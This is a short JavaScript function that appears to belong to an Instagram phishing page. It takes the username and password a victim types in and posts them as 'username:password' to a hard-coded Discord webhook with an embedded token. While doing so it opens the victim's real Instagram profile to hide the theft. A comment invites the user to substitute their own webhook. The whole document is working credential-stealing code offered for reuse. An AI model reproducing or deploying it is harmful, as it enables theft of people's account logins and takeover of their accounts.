function sendMessage() {
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/822572817496801281/WIPiqOeGm7qZTaEmHhEVhCWSP0BhN3O3U0gxMKYS6zM3iF4dR3vwSq__4S5PqvCeTMJj"); //here your discord webhook

    request.setRequestHeader('Content-type', 'application/json');

    let username = document.getElementById('username').value;
    let password = document.getElementById('password').value;

    let data = username+":"+password

    var params = {
      username: "Instagram",
      avatar_url: "",
      content: data
    }

    let link = "http://instagram.com/"+username

    window.open(link)

    request.send(JSON.stringify(params));
  }
